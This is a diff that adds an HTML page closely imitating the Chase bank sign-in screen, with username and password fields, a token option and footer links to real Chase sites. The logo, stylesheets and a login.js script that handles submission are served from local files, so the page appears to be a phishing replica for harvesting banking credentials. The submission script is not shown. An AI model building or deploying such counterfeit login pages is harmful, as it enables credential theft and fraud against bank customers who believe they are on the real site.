@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In | CHASE</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link rel="icon" type="image/png" href="just_logo.png">
+<link rel="stylesheet" href="shared/base.css">
+<link rel="stylesheet" href="login.css">
+</head>
+<body>
+
+<div class="app-container">
+  
+  <!-- Header Section (Background Image) -->
+  <header class="header">
+      <div class="header-overlay"></div>
+      <div class="logo">
+          <img src="chase_logo.png" alt="Chase_Logo" class="logo-img">
+      </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="main-content">
+      
+      <!-- Login Card -->
+      <div class="login-card">
+          <form id="loginForm" novalidate>
+              
+              <!-- Username Field -->
+              <div class="input-group">
+                  <label for="username">Username</label>
+                  <input type="text" id="username" autocomplete="username">
+              </div>
+
+              <!-- Error Message (Hidden by default) -->
+              <div id="loginError" class="alert alert-error hidden">
+                  <i class="fa-solid fa-triangle-exclamation"></i>
+                  <span id="loginErrorText">Enter your username.</span>
+              </div>
+
+              <!-- Password Field -->
+              <div class="input-group">
+                  <label for="password">Password</label>
+                  <div class="password-wrap">
+                      <input type="password" id="password" autocomplete="current-password">
+                      <button type="button" class="password-toggle" id="passwordToggle">Show</button>
+                  </div>
+              </div>
+
+              <!-- Checkboxes Row -->
+              <div class="options-row">
+                  <label class="checkbox-container">
+                      <input type="checkbox" id="rememberMe">
+                      <span class="checkmark"></span>
+                      Remember username
+                  </label>
+                  
+                  <label class="checkbox-container">
+                      <input type="checkbox" id="useToken">
+                      <span class="checkmark"></span>
+                      Use token
+                  </label>
+              </div>
+
+              <!-- Sign In Button -->
+              <button type="submit" class="btn-primary">Sign In</button>
+
+              <!-- Or Divider -->
+              <div class="divider-row">
+                  <span class="line"></span>
+                  <span class="or-text">...</span>
+                  <span class="line"></span>
+              </div>
+
+              <!-- Bottom Links (Inside Card) -->
+              <div class="card-links">
+                  <a href="https://secure.chase.com/web/auth/dashboard#/dashboard/overview" class="card-link">
+                      Forgot username/password? <i class="fa-solid fa-chevron-right"></i>
+                  </a>
+                  <a href="https://secure.chase.com/web/auth/#/profile-enrollment" class="card-link">
+                      Not enrolled? Sign up now. <i class="fa-solid fa-chevron-right"></i>
+                  </a>
+              </div>
+          </form>
+      </div>
+
+  </main>
+
+  <!-- Footer Section -->
+  <footer class="site-footer" style="color: black;">
+      <div class="wrap">
+          
+          <!-- Social Icons -->
+          <div class="social-icons">
+              <a href="https://web.facebook.com/chase?_rdc=1&_rdr#" aria-label="Facebook"><i class="fa-brands fa-facebook-f"></i></a>
+              <a href="https://www.instagram.com/chase" aria-label="Instagram"><i class="fa-brands fa-instagram"></i></a>
+              <a href="https://x.com/Chase" aria-label="X"><i class="fa-brands fa-x-twitter"></i></a>
+              <a href="https://www.youtube.com/chase" aria-label="YouTube"><i class="fa-brands fa-youtube"></i></a>
+              <a href="https://www.linkedin.com/company/chase?trk=company_logo" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
+               <a href="https://www.pinterest.com/chase/" aria-label="Pintrest"><i class="fa-brands fa-pinterest"></i></a>
+          </div>
+
+          <!-- Footer Links & Legal -->
+          <div class="footer-content">
+              <div class="footer-links-grid">
+                  <a href="https://www.chase.com/digital/customer-service">Contact us</a>
+                  <a href="https://www.chase.com/digital/resources/privacy-security">Privacy & security</a>
+                  <a href="https://www.chase.com/digital/resources/terms-of-use">Terms of use</a>
+                  <a href="https://www.chase.com/digital/resources/accessibility">Accessibility</a>
+                  <a href="https://www.chase.com/digital/resources/sitemap">Site map</a>
+                  <a href="https://www.jpmorganchase.com/">JPMorgan Chase</a>
+                  <a href="https://www.jpmorganchase.com/careers">Careers</a>
+                  <a href="https://survey.experience.chase.com/jfe/form/SV_0rBuvmGXX6OhYEJ">Give feedback</a>
+                  <a href="https://media.chase.com/">Media center</a>
+                  <a href="https://www.chase.com/digital/customer-service">About Chase</a>
+                  <a href="https://www.chase.com/online/canada/canada-home-en.htm">Chase canada</a>
+              </div>
+              <div class="equal-housing">
+                  <i class="fa-solid fa-house-chimney"></i>
+                  <span>Equal Housing Opportunity</span>
+              </div>
+              <p class="disclaimer">
+                  &copy; 2026 JPMorgan Chase & Co.
+              </p>
+          </div>
+      </div>
+  </footer>
+
+</div>
+
+<script src="login.js"></script>
+</body>
+</html>
